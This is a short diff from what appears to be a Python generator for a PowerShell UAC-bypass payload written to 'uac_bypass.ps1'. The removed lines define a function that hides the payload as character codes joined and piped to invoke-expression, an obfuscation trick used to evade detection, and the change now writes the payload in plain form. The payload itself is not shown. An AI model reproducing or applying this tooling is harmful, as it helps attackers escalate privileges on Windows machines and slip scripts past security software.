@@ -146,9 +146,6 @@ for match in range(int(full_payload.count("\\")/2)):
                            full_payload,
                            count=1)
 
-def script_to_char(s):
-    return "([string]::join('',((" + ','.join(str(ord(c)) for c in s) + r")|%{[char]$_})))|invoke-expression"
-       
 with open('uac_bypass.ps1', 'w') as c:
-    c.write(script_to_char(full_payload))
+    c.write(full_payload)
 print("Check files for uac_bypass.ps1")
